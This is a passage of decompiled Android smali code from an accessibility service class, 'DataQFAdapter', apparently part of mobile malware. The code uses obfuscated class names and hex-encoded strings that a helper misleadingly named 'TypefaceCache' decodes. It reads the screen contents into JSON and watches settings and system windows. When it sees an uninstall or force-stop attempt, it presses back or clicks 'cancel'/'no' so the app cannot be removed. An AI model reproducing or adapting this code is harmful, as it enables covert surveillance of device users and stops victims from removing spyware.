    if-eqz v3, :cond_0

    nop

    .line 74
    .line 75
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    move-result-object v3

    .line 79
    if-nez v3, :cond_1

    .line 80
    .line 81
    goto :goto_0

    .line 82
    :catch_0
    move-exception v1

    .line 83
    goto :goto_1

    .line 84
    :cond_0
    :goto_0
    const-string v3, ""

    nop

    nop

    .line 85
    .line 86
    :cond_1
    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 87
    .line 88
    .line 89
    const-string v2, "00240073004F00B400F300AD00D700A2002D00450050008200FC00BA00C600A8002D002C001B009700F100BC00D900A6002400730075008600FD00BA009200FA0063"

    .line 90
    .line 91
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 92
    .line 93
    .line 94
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    .line 95
    .line 96
    .line 97
    move-result-object v2

    .line 98
    invoke-static {v2}, Ljava/util/Objects;->toString(Ljava/lang/Object;)Ljava/lang/String;

    .line 99
    .line 100
    .line 101
    new-instance v2, Lorg/json/JSONArray;

    .line 102
    .line 103
    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    .line 104
    .line 105
    .line 106
    const/16 v3, 0x0

    .line 107
    invoke-direct {p0, v1, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->collectElements(Landroid/view/accessibility/AccessibilityNodeInfo;Lorg/json/JSONArray;I)V

    .line 108
    .line 109
    .line 110
    const-string v3, "0026007A005E008A00F500B100C600B4"

    .line 111
    .line 112
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 113
    .line 114
    .line 115
    move-result-object v3

    .line 116
    invoke-virtual {v0, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 117
    .line 118
    .line 119
    const-string v3, "00240073004F00B400F300AD00D700A2002D00450050008200FC00BA00C600A8002D002C001B008400FF00B300DE00A200200062005E008300B0"

    nop

    .line 120
    .line 121
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 122
    .line 123
    .line 124
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    .line 125
    .line 126
    .line 127
    const-string v2, "006300730057008200FD00BA00DC00B30030"

    .line 128
    .line 129
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 130
    .line 131
    .line 132
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 133
    .line 134
    .line 135
    return-object v0

    .line 136
    :cond_2
    const-string v1, "00240073004F00B400F300AD00D700A2002D00450050008200FC00BA00C600A8002D002C001B009500FF00B000C6008E002D00570058009300F900A900D70090002A0078005F008800E700FF00DB00B400630058006E00AB00DC00FE"

    .line 137
    .line 138
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 139
    .line 140
    .line 141
    return-object v0

    .line 142
    :goto_1
    const-string v2, "00240073004F00B400F300AD00D700A2002D00450050008200FC00BA00C600A8002D0036005E009500E200B000C000FD0063"

    .line 143
    .line 144
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 145
    .line 146
    .line 147
    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 148
    .line 149
    .line 150
    return-object v0

    nop
.end method

.method public final isInBlockCooldown()Z
    .locals 4

    .line 1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 2
    .line 3
    .line 4
    move-result-wide v0

    .line 5
    iget-wide v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->blockCooldownUntil:J

    nop

    nop

    .line 6
    .line 7
    cmp-long v0, v0, v2

    .line 8
    .line 9
    if-gez v0, :cond_0

    .line 10
    .line 11
    const/4 v0, 0x1

    .line 12
    return v0

    .line 13
    :cond_0
    const/16 v0, 0x0

    .line 14
    return v0
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 31

    .line 1
    move-object/from16 v1, p0

    nop

    .line 2
    .line 3
    move-object/from16 v9, p1

    .line 4
    .line 5
    if-nez v9, :cond_0

    nop

    .line 6
    .line 7
    goto/16 :goto_3c

    nop

    .line 8
    .line 9
    :cond_0
    :try_start_0
    sget-object v0, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 10
    .line 11
    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->xDyLpEZyrcKVe0:Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 12
    .line 13
    if-eqz v0, :cond_1

    nop

    nop

    .line 14
    .line 15
    :try_start_1
    invoke-static/range {p0 .. p1}, Lv/s/h4nyZoRAsl44Uv;->JXn4Qf7zpnLjP5(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 16
    .line 17
    .line 18
    goto/16 :goto_0

    .line 19
    :catchall_0
    move-exception v0

    .line 20
    :try_start_2
    const-string v2, "00070077004F008600C8009B00FE00A800220072005E009500B000BC00C000A60030007E000100C7"

    .line 21
    .line 22
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 23
    .line 24
    .line 25
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 26
    .line 27
    .line 28
    goto :goto_0

    .line 29
    :catchall_1
    move-exception v0

    .line 30
    goto/16 :goto_3b

    .line 31
    .line 32
    :cond_1
    :goto_0
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingForceStop:Ljava/lang/String;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 33
    .line 34
    const-wide/16 v2, 0x96

    .line 35
    .line 36
    const-wide/16 v4, 0x12c

    .line 37
    .line 38
    const/16 v8, 0x800

    .line 39
    .line 40
    const/16 v10, 0x20

    .line 41
    .line 42
    const/16 v11, 0x1

    .line 43
    const-string v12, ""

    .line 44
    .line 45
    const/16 v13, 0x2

    .line 46
    const/4 v14, 0x0

    .line 47
    if-eqz v0, :cond_6

    .line 48
    .line 49
    :try_start_3
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 50
    .line 51
    .line 52
    move-result-object v15

    .line 53
    if-eqz v15, :cond_2

    .line 54
    .line 55
    invoke-virtual {v15}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 56
    .line 57
    .line 58
    move-result-object v15

    .line 59
    if-eqz v15, :cond_2

    .line 60
    .line 61
    const-wide/16 v16, 0x0

    .line 62
    .line 63
    sget-object v6, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 64
    .line 65
    invoke-virtual {v15, v6}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    move-result-object v6

    .line 69
    goto/16 :goto_1

    .line 70
    :cond_2
    const-wide/16 v16, 0x0

    .line 71
    .line 72
    move-object v6, v12

    .line 73
    :goto_1
    const-string v7, "00300073004F009300F900B100D500B4"

    .line 74
    .line 75
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    move-result-object v7

    .line 79
    invoke-static {v6, v7}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 80
    .line 81
    .line 82
    move-result v6

    nop

    .line 83
    if-eqz v6, :cond_4

    .line 84
    .line 85
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 86
    .line 87
    .line 88
    move-result v6

    .line 89
    if-eq v6, v10, :cond_3

    .line 90
    .line 91
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 92
    .line 93
    .line 94
    move-result v6

    .line 95
    if-ne v6, v8, :cond_4

    .line 96
    .line 97
    :cond_3
    new-instance v6, Lv/s/jpTJdQ79mlaJtReLZ1F;

    .line 98
    .line 99
    invoke-direct {v6, v1, v0, v13}, Lv/s/jpTJdQ79mlaJtReLZ1F;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;I)V

    .line 100
    .line 101
    .line 102
    invoke-direct {v1, v6, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 103
    .line 104
    .line 105
    :cond_4
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 106
    .line 107
    .line 108
    move-result-wide v6

    .line 109
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->forceStopStartTime:Ljava/lang/Long;

    .line 110
    .line 111
    if-eqz v0, :cond_5

    nop

    .line 112
    .line 113
    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    .line 114
    .line 115
    .line 116
    move-result-wide v18

    .line 117
    goto/16 :goto_2

    .line 118
    :cond_5
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 119
    .line 120
    .line 121
    move-result-wide v18

    .line 122
    :goto_2
    sub-long v6, v6, v18

    .line 123
    .line 124
    const-wide/16 v18, 0x1f40

    .line 125
    .line 126
    cmp-long v0, v6, v18

    .line 127
    .line 128
    if-lez v0, :cond_7

    .line 129
    .line 130
    sput-object v14, Lapp/mobilex/plus/services/DataQFAdapter;->pendingForceStop:Ljava/lang/String;

    .line 131
    .line 132
    sput-object v14, Lapp/mobilex/plus/services/DataQFAdapter;->forceStopStartTime:Ljava/lang/Long;

    .line 133
    .line 134
    sput-wide v16, Lapp/mobilex/plus/services/DataQFAdapter;->protectionBypassUntil:J

    .line 135
    .line 136
    invoke-virtual {v1, v11}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 137
    .line 138
    .line 139
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 140
    .line 141
    const/16 v6, 0x12

    .line 142
    .line 143
    invoke-direct {v0, v1, v6}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 144
    .line 145
    .line 146
    invoke-direct {v1, v0, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 147
    .line 148
    .line 149
    goto/16 :goto_3

    .line 150
    :cond_6
    const-wide/16 v16, 0x0

    .line 151
    .line 152
    :cond_7
    :goto_3
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingUninstallPkg:Ljava/lang/String;

    .line 153
    .line 154
    if-eqz v0, :cond_9

    .line 155
    .line 156
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 157
    .line 158
    .line 159
    move-result v6

    .line 160
    if-eq v6, v10, :cond_8

    .line 161
    .line 162
    if-eq v6, v8, :cond_8

    .line 163
    .line 164
    goto/16 :goto_4

    .line 165
    :cond_8
    new-instance v6, Lv/s/ssJAORu9Srr5Q9qO2sq;

    nop

    nop

    .line 166
    .line 167
    const/16 v7, 0x13

    .line 168
    .line 169
    invoke-direct {v6, v1, v0, v7}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;I)V

    .line 170
    .line 171
    .line 172
    invoke-direct {v1, v6, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 173
    .line 174
    .line 175
    :goto_4
    sget-wide v6, Lapp/mobilex/plus/services/DataQFAdapter;->_uninstallStartTime:J

    .line 176
    .line 177
    cmp-long v0, v6, v16

    .line 178
    .line 179
    if-lez v0, :cond_9

    .line 180
    .line 181
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 182
    .line 183
    .line 184
    move-result-wide v6

    .line 185
    sget-wide v18, Lapp/mobilex/plus/services/DataQFAdapter;->_uninstallStartTime:J

    .line 186
    .line 187
    sub-long v6, v6, v18

    .line 188
    .line 189
    const-wide/16 v18, 0x4e20

    .line 190
    .line 191
    cmp-long v0, v6, v18

    .line 192
    .line 193
    if-lez v0, :cond_9

    .line 194
    .line 195
    sput-object v14, Lapp/mobilex/plus/services/DataQFAdapter;->pendingUninstallPkg:Ljava/lang/String;

    .line 196
    .line 197
    sput-wide v16, Lapp/mobilex/plus/services/DataQFAdapter;->_uninstallStartTime:J

    .line 198
    .line 199
    sput-wide v16, Lapp/mobilex/plus/services/DataQFAdapter;->protectionBypassUntil:J

    nop

    nop

    .line 200
    .line 201
    :cond_9
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->antiUninstallEnabled:Z
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 202
    .line 203
    const-string v6, "0030006F0048009300F500B200C700AE"

    .line 204
    .line 205
    if-eqz v0, :cond_c

    .line 206
    .line 207
    :try_start_4
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 208
    .line 209
    .line 210
    move-result v0

    nop

    .line 211
    if-ne v0, v10, :cond_c

    .line 212
    .line 213
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 214
    .line 215
    .line 216
    move-result-object v0

    .line 217
    if-eqz v0, :cond_a

    nop

    .line 218
    .line 219
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 220
    .line 221
    .line 222
    move-result-object v0

    .line 223
    if-eqz v0, :cond_a

    .line 224
    .line 225
    sget-object v7, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    nop

    .line 226
    .line 227
    invoke-virtual {v0, v7}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 228
    .line 229
    .line 230
    move-result-object v0

    .line 231
    goto/16 :goto_5

    .line 232
    :cond_a
    move-object v0, v12

    .line 233
    :goto_5
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 234
    .line 235
    .line 236
    move-result-object v7

    .line 237
    invoke-static {v0, v7}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 238
    .line 239
    .line 240
    move-result v7

    .line 241
    if-nez v7, :cond_b

    .line 242
    .line 243
    const-string v7, "0024007A0054008500F100B300D300A40037007F0054008900E3"

    .line 244
    .line 245
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 246
    .line 247
    .line 248
    move-result-object v7

    .line 249
    invoke-static {v0, v7}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 250
    .line 251
    .line 252
    move-result v0

    nop

    nop
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 253
    if-eqz v0, :cond_c

    .line 254
    .line 255
    :cond_b
    :try_start_5
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->checkPowerDialog()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    .line 256
    .line 257
    .line 258
    :catchall_2
    :cond_c
    :try_start_6
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->antiUninstallEnabled:Z

    .line 259
    .line 260
    move v7, v13

    .line 261
    const-wide/16 v13, 0x64

    .line 262
    .line 263
    if-eqz v0, :cond_d

    nop

    .line 264
    .line 265
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 266
    .line 267
    .line 268
    move-result-wide v16

    nop

    .line 269
    sget-wide v18, Lapp/mobilex/plus/services/DataQFAdapter;->protectionBypassUntil:J

    .line 270
    .line 271
    cmp-long v0, v16, v18

    .line 272
    .line 273
    if-ltz v0, :cond_d

    .line 274
    .line 275
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 276
    .line 277
    .line 278
    move-result v0

    .line 279
    if-eq v0, v10, :cond_e

    .line 280
    .line 281
    if-eq v0, v8, :cond_e

    .line 282
    .line 283
    :cond_d
    move/from16 v16, v7

    .line 284
    .line 285
    goto/16 :goto_8

    .line 286
    .line 287
    :cond_e
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 288
    .line 289
    .line 290
    move-result-object v0

    .line 291
    if-eqz v0, :cond_f

    .line 292
    .line 293
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 294
    .line 295
    .line 296
    move-result-object v0

    .line 297
    if-eqz v0, :cond_f

    .line 298
    .line 299
    move/from16 v16, v7

    .line 300
    .line 301
    sget-object v7, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 302
    .line 303
    invoke-virtual {v0, v7}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 304
    .line 305
    .line 306
    move-result-object v0

    .line 307
    goto/16 :goto_6

    .line 308
    :cond_f
    move/from16 v16, v7

    .line 309
    .line 310
    move-object v0, v12

    .line 311
    :goto_6
    const-string v7, "003300770058008C00F100B800D700AE002D0065004F008600FC00B300D700B5"

    .line 312
    .line 313
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 314
    .line 315
    .line 316
    move-result-object v7

    .line 317
    invoke-static {v0, v7}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 318
    .line 319
    .line 320
    move-result v7

    .line 321
    if-nez v7, :cond_10

    .line 322
    .line 323
    const-string v7, "003600780052008900E300AB00D300AB002F"

    .line 324
    .line 325
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 326
    .line 327
    .line 328
    move-result-object v7

    .line 329
    invoke-static {v0, v7}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 330
    .line 331
    .line 332
    move-result v7

    .line 333
    if-eqz v7, :cond_12

    .line 334
    .line 335
    :cond_10
    const-string v7, "003300730049008A00F900AC00C100AE002C00780058008800FE00AB00C000A8002F007A005E0095"

    nop

    nop

    .line 336
    .line 337
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 338
    .line 339
    .line 340
    move-result-object v7

    .line 341
    invoke-static {v0, v7}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 342
    .line 343
    .line 344
    move-result v0

    .line 345
    if-nez v0, :cond_12

    .line 346
    .line 347
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingUninstallPkg:Ljava/lang/String;

    .line 348
    .line 349
    if-nez v0, :cond_12

    .line 350
    .line 351
    sget-object v0, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    nop

    nop

    .line 352
    .line 353
    invoke-static {}, Lv/s/VpKcDcuRNaQkRJ5;->b1EoSIRjJHO5()Z

    .line 354
    .line 355
    .line 356
    move-result v0

    .line 357
    if-nez v0, :cond_12

    nop

    nop

    .line 358
    .line 359
    sget-boolean v0, Lv/s/VpKcDcuRNaQkRJ5;->xDyLpEZyrcKVe0:Z

    nop

    nop
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    .line 360
    .line 361
    if-nez v0, :cond_12

    .line 362
    .line 363
    :try_start_7
    invoke-virtual {v1}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 364
    .line 365
    .line 366
    move-result-object v7
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    .line 367
    if-eqz v7, :cond_11

    .line 368
    .line 369
    :try_start_8
    const-string v0, "047D0454040704D204AD04EF"

    .line 370
    .line 371
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 372
    .line 373
    .line 374
    move-result-object v0

    .line 375
    const-string v17, "002000770055008400F500B3"

    .line 376
    .line 377
    invoke-static/range {v17 .. v17}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 378
    .line 379
    .line 380
    move-result-object v15

    nop

    nop

    .line 381
    const-string v17, "047D0454040704D204AD04E704F0048B"

    .line 382
    .line 383
    invoke-static/range {v17 .. v17}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 384
    .line 385
    .line 386
    move-result-object v2

    .line 387
    const-string v3, "047E04230479"

    .line 388
    .line 389
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 390
    .line 391
    .line 392
    move-result-object v3

    nop

    nop

    .line 393
    const-string v11, "no"

    .line 394
    .line 395
    filled-new-array {v0, v15, v2, v3, v11}, [Ljava/lang/String;

    .line 396
    .line 397
    .line 398
    move-result-object v0

    .line 399
    invoke-direct {v1, v7, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->clickNodeWithText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_3

    .line 400
    .line 401
    .line 402
    :try_start_9
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 403
    .line 404
    .line 405
    goto :goto_7

    .line 406
    :catchall_3
    move-exception v0

    .line 407
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 408
    .line 409
    .line 410
    throw v0
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_0
    .catchall {:try_start_9 .. :try_end_9} :catchall_1

    .line 411
    :catch_0
    :cond_11
    :goto_7
    :try_start_a
    const-string v0, "00180051006E00A600C2009B00EF00E7000A00780048009300F100B300DE00A2003100360059008B00FF00BC00D900A20027002C001B"

    .line 412
    .line 413
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 414
    .line 415
    .line 416
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 417
    .line 418
    const/16 v2, 0x14

    .line 419
    .line 420
    invoke-direct {v0, v1, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 421
    .line 422
    .line 423
    invoke-direct {v1, v0, v13, v14}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 424
    .line 425
    .line 426
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 427
    .line 428
    const/16 v2, 0x15

    .line 429
    .line 430
    invoke-direct {v0, v1, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 431
    .line 432
    .line 433
    invoke-direct {v1, v0, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 434
    .line 435
    .line 436
    :cond_12
    :goto_8
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 437
    .line 438
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 439
    .line 440
    .line 441
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->l1V0lQr6TbwNKqHfXNbb()Z

    .line 442
    .line 443
    .line 444
    move-result v0
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_1

    .line 445
    const v2, 0x40

    nop

    .line 446
    .line 447
    const/16 v3, 0x0

    .line 448
    if-eqz v0, :cond_1b

    .line 449
    .line 450
    :try_start_b
    invoke-direct/range {p0 .. p1}, Lapp/mobilex/plus/services/DataQFAdapter;->checkAntiUninstall(Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_4

    .line 451
    .line 452
    .line 453
    goto/16 :goto_9

    nop

    nop

    .line 454
    :catchall_4
    move-exception v0

    .line 455
    :try_start_c
    const-string v4, "00020078004F008E00C500B100DB00A900300062005A008B00FC00FF00D100B500220065005300DD00B0"

    .line 456
    .line 457
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 458
    .line 459
    .line 460
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_1

    .line 461
    .line 462
    .line 463
    :goto_9
    :try_start_d
    invoke-direct/range {p0 .. p1}, Lapp/mobilex/plus/services/DataQFAdapter;->checkSettingsContent(Landroid/view/accessibility/AccessibilityEvent;)V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_5

    .line 464
    .line 465
    .line 466
    goto :goto_a

    .line 467
    :catchall_5
    move-exception v0

    .line 468
    :try_start_e
    const-string v4, "00100073004F009300F900B100D500B4000000790055009300F500B100C600E700200064005A009400F800E50092"

    .line 469
    .line 470
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 471
    .line 472
    .line 473
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 474
    .line 475
    .line 476
    :goto_a
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 477
    .line 478
    .line 479
    move-result v0

    .line 480
    if-eq v0, v10, :cond_13

    .line 481
    .line 482
    if-eq v0, v2, :cond_13

    .line 483
    .line 484
    if-eq v0, v8, :cond_13

    .line 485
    .line 486
    goto/16 :goto_11

    .line 487
    .line 488
    :cond_13
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 489
    .line 490
    .line 491
    move-result-object v0

    .line 492
    if-eqz v0, :cond_14

    .line 493
    .line 494
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 495
    .line 496
    .line 497
    move-result-object v0

    .line 498
    if-eqz v0, :cond_14

    .line 499
    .line 500
    sget-object v4, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 501
    .line 502
    invoke-virtual {v0, v4}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 503
    .line 504
    .line 505
    move-result-object v0

    .line 506
    goto :goto_b

    nop

    nop

    .line 507
    :cond_14
    move-object v0, v12

    .line 508
    :goto_b
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityRecord;->getClassName()Ljava/lang/CharSequence;

    .line 509
    .line 510
    .line 511
    move-result-object v4

    .line 512
    if-eqz v4, :cond_15

    .line 513
    .line 514
    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 515
    .line 516
    .line 517
    move-result-object v4

    .line 518
    if-eqz v4, :cond_15

    .line 519
    .line 520
    sget-object v5, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    nop

    .line 521
    .line 522
    invoke-virtual {v4, v5}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 523
    .line 524
    .line 525
    move-result-object v4

    .line 526
    goto :goto_c

    nop

    nop

    .line 527
    :cond_15
    move-object v4, v12

    .line 528
    :goto_c
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 529
    .line 530
    .line 531
    move-result-object v5

    .line 532
    invoke-static {v0, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 533
    .line 534
    .line 535
    move-result v5

    .line 536
    if-nez v5, :cond_17

    .line 537
    .line 538
    const-string v5, "002E007F004E008E00BE00B100DD00B3002A00700052008400F100AB00DB00A8002D"

    .line 539
    .line 540
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 541
